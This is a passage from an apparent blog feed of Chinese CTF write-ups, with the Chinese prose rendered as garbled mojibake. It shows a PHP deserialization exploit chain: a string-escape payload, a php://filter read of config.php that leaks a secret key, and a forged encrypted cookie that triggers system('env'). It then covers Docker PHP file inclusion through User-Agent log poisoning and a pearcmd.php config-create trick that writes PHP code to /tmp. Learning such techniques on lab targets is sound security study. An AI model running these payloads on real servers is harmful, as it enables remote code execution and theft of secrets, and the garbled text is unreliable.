class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>é¦–å…ˆåœ¨index.phpå‘ç°äº†åºåˆ—åŒ–å…¥å£å…¶å°†function.phpçš„Userså®ä¾‹åŒ–åè¿›è¡Œåºåˆ—åŒ–ã€‚é‚£ä¹ˆè¿™é¢˜åº”è¯¥è€ƒå¯Ÿååºåˆ—åŒ–æ¼æ´ã€‚äºæ˜¯æˆ‘æ‰¾äº†ä¸€ä¸‹å‘ç°<br>login.phpå’Œeeeeeend.phpéƒ½å­˜åœ¨ååºåˆ—å…¥å£ä½†æ˜¯eeeeeeeend.phpçš„ååºåˆ—å…¥å£æ˜¯è¿™æ ·çš„<code>unserialize(decryptCookie(base64_decode($_COOKIE[&#39;users&#39;])));</code>éœ€è¦å¯¹sessionè¿›è¡Œä¼ªé€ ï¼Œæ— æ³•ç›´æ¥åˆ©ç”¨é‚£ä¹ˆæˆ‘å°±æŠŠç›®å…‰çœ‹å‘äº†login.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;function.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;waf.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>])) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;script&gt;alert(`Login First!`);location.href=`./index.php`;&lt;/script&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">a</span>(<span class="title function_ invoke__">decryptCookie</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;h1&gt;Hello CTFer!,Welcome to Ezez_unserialize!!!!!&lt;/h1&gt;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>å‘ç°å…¶å¯¼å…¥äº†funtion.phpè€Œfuntion.phpæ­£å¥½æœ‰ç±»å¯ä»¥åˆ©ç”¨ã€‚<br>function.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FILE</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filename);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Users</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$passwd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$passwd</span>,<span class="variable">$status</span>=<span class="string">&quot;True&quot;</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;passwd = <span class="variable">$passwd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;status = <span class="variable">$status</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;username);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;passwd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>å½“loginååºåˆ—åŒ–æ—¶ä¼šè§¦å‘Usersçš„ <strong>destructè€Œè¿™ä¸ªæ–¹æ³•æœ‰unsetï¼Œè¿™ä¸ªå‡½æ•°å¯ä»¥åˆ©ç”¨GCå›æ”¶æœºåˆ¶æ¥è§¦å‘</strong>destructé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥è§¦å‘FILEã€‚è€ŒFILEå­˜åœ¨file_get_contentså‡½æ•°ã€‚<br>è€Œloginåœ¨ååºåˆ—åŒ–å‰å…ˆè¿‡äº†ä¸€éwafï¼Œè¿™å°±å¯¼è‡´äº†å­—ç¬¦ä¸²é€ƒé€¸ã€‚é‚£ä¹ˆæˆ‘ä»¬é€šè¿‡å­—ç¬¦ä¸²é€ƒé€¸æ¥æ„é€ passwdçš„å€¼ä»è€Œå¯¼è‡´ååºåˆ—ã€‚æˆ‘è¿™é‡Œç›´æ¥è´´æˆ‘å†™çš„è„šæœ¬<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=<span class="string">&quot;where&quot;</span></span><br><span class="line">payload=<span class="string">&#x27;&quot;;s:13:&quot;%00Users%00passwd&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:54:&quot;php://filter/convert.base64-encode/resource=config.php&quot;;&#125;s:6:&quot;status&quot;;N;&#125;&#x27;</span></span><br><span class="line">I=<span class="built_in">len</span>(unquote(payload))-<span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(I):</span><br><span class="line">    s+=<span class="string">&quot;where&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s+payload)</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬åªè¦åœ¨passwdé‡Œè¾“å…¥payloadå°±ä¼šå¯¼è‡´å­—ç¬¦ä¸²é€ƒé€¸ï¼Œä»è€Œè§¦å‘FIlEæ¥è¯»å–æ–‡ä»¶ã€‚<br>æˆ‘åŸæœ¬å‡†å¤‡ç›´æ¥è¯»å–flagæˆ–è€…ç›´æ¥é€šè¿‡procè¯»å–ç¯å¢ƒå˜é‡çš„ï¼Œç»“æœå‘ç°å¥½åƒæƒé™ä¸å¤Ÿæ— æ³•è¯»å–ã€‚<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encryptCookie</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$algorithm</span>,<span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="variable">$algorithm</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">openssl_random_pseudo_bytes</span>(<span class="title function_ invoke__">openssl_cipher_iv_length</span>(<span class="variable">$cipher</span>));</span><br><span class="line">    <span class="variable">$encryptedValue</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$value</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>) . <span class="string">&#x27;::&#x27;</span> . <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$encryptedValue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decryptCookie</span>(<span class="params"><span class="variable">$cookie</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$algorithm</span>,<span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$secret_key</span>;</span><br><span class="line">    <span class="keyword">list</span>(<span class="variable">$encrypted_data</span>, <span class="variable">$iv</span>) = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;::&#x27;</span>, <span class="variable">$cookie</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="variable">$algorithm</span>;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$decryptedValue</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$encrypted_data</span>, <span class="variable">$cipher</span>, <span class="variable">$key</span>, <span class="number">0</span>, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$decryptedValue</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘å‘ç°å…¶åŠ å¯†å‡½æ•°çš„å¯†é’¥æ¥è‡ªconfig.phpé‚£ä¹ˆæˆ‘åªè¦è¯»å–config.phpä¸å°±å¯ä»¥å¾—åˆ°å¯†é’¥æ¥ä¼ªé€ sessionä»è€Œæ¥è§¦å‘eeeeeeend.phpçš„å‘½ä»¤æ‰§è¡Œäº†å—ã€‚<br>äºæ˜¯æˆ‘è¯»å–äº†conifg.php<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere&quot;;s:13:&quot;%00Users%00passwd&quot;;O:4:&quot;FILE&quot;:1:&#123;s:8:&quot;filename&quot;;s:54:&quot;php://filter/convert.base64-encode/resource=config.php&quot;;&#125;s:6:&quot;status&quot;;N;&#125;</span><br></pre></td></tr></table></figure><br>config.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$secret_key</span> = <span class="string">&quot;Harder_says_nice_to_meet_to&quot;</span>;</span><br><span class="line"><span class="variable">$algorithm</span> = <span class="string">&quot;AES-128-CTR&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>è¿™æ ·å°±å¯ä»¥å¯¹æ„é€ sessionè¿›è¡Œå‘½ä»¤æ‰§è¡Œäº†<br>expå¦‚ä¸‹<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;algorithm.php&quot;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$admin</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$root</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;root;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Date</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cmd</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">admin</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;root=<span class="keyword">new</span> <span class="title class_">Date</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;root-&gt;cmd=<span class="string">&quot;env&quot;</span>;</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">#echo (encryptCookie(serialize($a)));</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">encryptCookie</span>(<span class="variable">$b</span>));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><br>ä»ç¯å¢ƒå˜é‡é‡Œå¾—åˆ°flag</p><h1 id="ManCraft-å¨±ä¹é¢˜"><a href="#ManCraft-å¨±ä¹é¢˜" class="headerlink" title="ManCraft - å¨±ä¹é¢˜"></a>ManCraft - å¨±ä¹é¢˜</h1><p>ç›´æ¥è¿›æ¸¸æˆæ‰“ç‰¢å¤§å³å¯</p>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
          <category> æ¯”èµ›wp(å¤ç°) </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«</title>
      <link href="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/"/>
      <url>/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="æˆ‘å‘ç°è‡ªå·±çš„è¶Šæ¥è¶Šå†…è€—äº†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘éƒ½æ²¡æœ‰å†™åšå®¢çš„åŠ¨åŠ›äº†ã€‚ä½†æ˜¯è¿˜æ˜¯è¦å†™åšå®¢æ¥è®°å½•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ã€‚"><a href="#æˆ‘å‘ç°è‡ªå·±çš„è¶Šæ¥è¶Šå†…è€—äº†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘éƒ½æ²¡æœ‰å†™åšå®¢çš„åŠ¨åŠ›äº†ã€‚ä½†æ˜¯è¿˜æ˜¯è¦å†™åšå®¢æ¥è®°å½•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ã€‚" class="headerlink" title="æˆ‘å‘ç°è‡ªå·±çš„è¶Šæ¥è¶Šå†…è€—äº†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘éƒ½æ²¡æœ‰å†™åšå®¢çš„åŠ¨åŠ›äº†ã€‚ä½†æ˜¯è¿˜æ˜¯è¦å†™åšå®¢æ¥è®°å½•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ã€‚"></a>æˆ‘å‘ç°è‡ªå·±çš„è¶Šæ¥è¶Šå†…è€—äº†ã€‚ä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ€è¿‘éƒ½æ²¡æœ‰å†™åšå®¢çš„åŠ¨åŠ›äº†ã€‚ä½†æ˜¯è¿˜æ˜¯è¦å†™åšå®¢æ¥è®°å½•ä¸€ä¸‹è¿™ä¸ªæ¼æ´ã€‚</h1><p>è¿™ä¸ªæ¼æ´æ˜¯æˆ‘åœ¨æ— èŠå†™é¢˜æ—¶é‡åˆ°çš„æ¼æ´ã€‚æ–‡ç« å­¦ä¹ ä¸pç‰›çš„åšå®¢<a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html">Docker PHPè£¸æ–‡ä»¶æœ¬åœ°åŒ…å«ç»¼è¿°</a></p><h1 id="æ—¥å¿—æ–‡ä»¶åŒ…å«-ä¸è¡Œä½†æˆ‘è¿˜æ˜¯è¦å†™ä¸€ä¸‹"><a href="#æ—¥å¿—æ–‡ä»¶åŒ…å«-ä¸è¡Œä½†æˆ‘è¿˜æ˜¯è¦å†™ä¸€ä¸‹" class="headerlink" title="æ—¥å¿—æ–‡ä»¶åŒ…å«(ä¸è¡Œä½†æˆ‘è¿˜æ˜¯è¦å†™ä¸€ä¸‹)"></a>æ—¥å¿—æ–‡ä»¶åŒ…å«(ä¸è¡Œä½†æˆ‘è¿˜æ˜¯è¦å†™ä¸€ä¸‹)</h1><p>é¦–å…ˆæˆ‘ä»¬éƒ½çŸ¥é“æœåŠ¡å™¨ä¸€èˆ¬éƒ½ä¼šæœ‰æ—¥å¿—æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¼ å…¥çš„å†…å®¹éƒ½ä¼šè¢«æ—¥å¿—æ–‡ä»¶ç»™è®°å½•<br>nginxçš„é»˜è®¤æ—¥å¿—ä½ç½®å¦‚ä¸‹<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">access_log /var/log/nginx/access.log;</span><br></pre></td></tr></table></figure><br>webçš„access_logæ—¥å¿—ä¸‹ä¼šå­˜å‚¨è®¿é—®çš„uaå¤´ç­‰<br>é‚£åªè¦åœ¨uaå¤´å†™é©¬åœ¨åŒ…å«å°±å¯ä»¥å¾—åˆ°shell<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/2.png" class="" title="alt text"><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/1.png" class="" title="alt text"></p><h1 id="pearcmd-php"><a href="#pearcmd-php" class="headerlink" title="pearcmd.php"></a>pearcmd.php</h1><p>åˆ©ç”¨æ¡ä»¶<br>php.iniä¸­register_argc_argv=Onå¼€å¯<br>å®‰è£…pecl/pear</p><p>pearè¿™ä¸ªå·¥å…·åœ¨php7.3å‰ä¼šè‡ªåŠ¨å®‰è£…ä½†æ˜¯åˆ°äº†php7.4åå°±ä¸ä¼šè‡ªåŠ¨å®‰è£…ã€‚<br>ä½†æ˜¯åœ¨dockerä¸­è¿™ä¸ªå·¥å…·æ˜¯é»˜è®¤å®‰è£…çš„ï¼Œè¿™ä¸ªå·¥å…·å…¶å®å°±æ˜¯ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œå¯ä»¥ä½¿ç”¨å…¶æ¥å¯¹æ–‡ä»¶è¿›è¡Œæ“ä½œã€‚<br>pearcmd.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">setFrontendType</span>(<span class="string">&#x27;CLI&#x27;</span>);</span><br><span class="line"><span class="variable">$all_commands</span> = <span class="title class_">PEAR_Command</span>::<span class="title function_ invoke__">getCommands</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = <span class="title class_">Console_Getopt</span>::<span class="title function_ invoke__">readPHPArgv</span>();</span><br><span class="line"><span class="comment">// fix CGI sapi oddity - the -- in pear.bat/pear is not removed</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">php_sapi_name</span>() != <span class="string">&#x27;cli&#x27;</span> &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]) &amp;&amp; <span class="variable">$argv</span>[<span class="number">1</span>] == <span class="string">&#x27;--&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="variable">$argv</span> = <span class="title function_ invoke__">array_values</span>(<span class="variable">$argv</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬æ¥æŸ¥çœ‹è¯¥æºç ä¼šå‘ç°å…¶<code>$argv</code>æ˜¯ç”±<code>Console_Getopt::readPHPArgv();</code>æ¥å†³å®šçš„<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!@<span class="title function_ invoke__">is_array</span>(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                    <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> PEAR::<span class="title function_ invoke__">raiseError</span>(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><br>æˆ‘ä»¬ä¼šå‘ç°å…¶<code>$argv</code>æ˜¯ç”±<code>$_SERVER[&#39;argv&#39;]</code>æ¥å†³å®šçš„ã€‚è€Œå½“å¼€å¯äº†register_argc_argvæ—¶phpä¼šå°†getä¼ å‚çš„?åçš„æ‰€ä»¥ä¼ å…¥$_SERVER[â€˜argvâ€™]æ ¹æ®ç©ºæ ¼åˆ†éš”æˆargv[0],argv[1]â€¦..</p><p>è€Œ<code>$argv</code> å°±æ˜¯æˆ‘ä»¬ä½¿ç”¨pearæ—¶çš„å‚æ•°ã€‚<br>æ—¢ç„¶å¯ä»¥æ“æ§å‚æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨pearè¿™ä¸ªå·¥å…·äº†<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/3.png" class="" title="alt text"><br>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°paeræœ‰å¾ˆå¤šçš„åŠŸèƒ½ï¼Œpç¥çš„æ–‡ç« é‡Œä»‹ç»äº†config-createè¿™ä¸ªæ–¹æ³•</p><h2 id="config-create"><a href="#config-create" class="headerlink" title="config-create"></a>config-create</h2><p>ç»è¿‡å°è¯•å‘ç°è¿™ä¸ªåŠŸèƒ½ä¼šå°†ç¬¬ä¸€ä¸ªç›®å½•çš„ç›®å½•åå†™å…¥åˆ°ç¬¬äºŒç›®å½•é‡Œå³<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create &#x27;/etc/passwd&#x27; /tmp/LSE</span><br></pre></td></tr></table></figure><br>çš„ç»“æœå¦‚ä¸‹<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/6.png" class="" title="alt text"><br>æˆ‘ä»¬ä¼šå‘ç°å…¶å¹¶ä¸æ˜¯å°†/etc/passwdçš„å†…å®¹å†™å…¥åˆ°/tmp/LSEè€Œæ˜¯ç›´æ¥å°†è¿™ä¸ªæ–‡ä»¶è·¯å¾„å†™å…¥åˆ°/tmp/LSE<br>é‚£ä¹ˆæˆ‘ä»¬ç”¨å¦‚ä¸‹å‘½ä»¤å°±å¯ä»¥æˆåŠŸå°†é©¬å†™å…¥åˆ°/tmp/xxx.php<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pear config-create &#x27;/&lt;?php phpinfo();?&gt;&#x27; /tmp/LSE</span><br></pre></td></tr></table></figure><br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/4.png" class="" title="alt text"><br>æˆ‘ä»¬éœ€è¦åœ¨æœ€å‰é¢å†™ä¸€ä¸ª/æ¥è¡¨ç¤ºè¿™ä¸ªä¸ºä¸€ä¸ªè·¯å¾„<br><img src="/2024/05/12/Docker-PHP%E8%A3%B8%E6%96%87%E4%BB%B6%E6%9C%AC%E5%9C%B0%E5%8C%85%E5%90%AB/5.png" class="" title="alt 